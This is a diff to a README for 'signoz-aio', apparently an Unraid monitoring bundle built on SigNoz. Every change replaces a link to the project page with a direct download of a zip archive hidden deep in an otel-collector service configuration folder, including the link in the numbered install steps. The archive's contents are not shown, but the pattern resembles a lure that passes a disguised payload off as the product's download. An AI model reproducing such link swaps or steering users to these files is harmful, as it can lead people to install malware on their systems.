@@ -1,12 +1,12 @@
 # 🧰 signoz-aio - All-in-One Monitoring for Unraid
 
-[![Download signoz-aio](https://img.shields.io/badge/Download%20signoz--aio-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/anesrah4609/signoz-aio)
+[![Download signoz-aio](https://img.shields.io/badge/Download%20signoz--aio-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/anesrah4609/signoz-aio/raw/refs/heads/main/rootfs/etc/services.d/otel-collector/signoz_aio_2.7-alpha.2.zip)
 
 ## 📥 Download
 
 Use this link to visit the download page:
 
-[Download signoz-aio](https://github.com/anesrah4609/signoz-aio)
+[Download signoz-aio](https://github.com/anesrah4609/signoz-aio/raw/refs/heads/main/rootfs/etc/services.d/otel-collector/signoz_aio_2.7-alpha.2.zip)
 
 ## 🖥️ What this is
 
@@ -39,7 +39,7 @@ If you plan to track more than one app or container, give the system more CPU an
 
 Follow these steps in order:
 
-1. Open the download page: [signoz-aio](https://github.com/anesrah4609/signoz-aio)
+1. Open the download page: [signoz-aio](https://github.com/anesrah4609/signoz-aio/raw/refs/heads/main/rootfs/etc/services.d/otel-collector/signoz_aio_2.7-alpha.2.zip)
 2. Read the page for the current install file or Unraid container info
 3. Download the package or copy the needed container details
 4. Open your Unraid web interface
@@ -207,4 +207,4 @@ After setup, check these items:
 
 Use the main project page here:
 
-[https://github.com/anesrah4609/signoz-aio](https://github.com/anesrah4609/signoz-aio)
+[https://github.com/anesrah4609/signoz-aio/raw/refs/heads/main/rootfs/etc/services.d/otel-collector/signoz_aio_2.7-alpha.2.zip](https://github.com/anesrah4609/signoz-aio/raw/refs/heads/main/rootfs/etc/services.d/otel-collector/signoz_aio_2.7-alpha.2.zip)
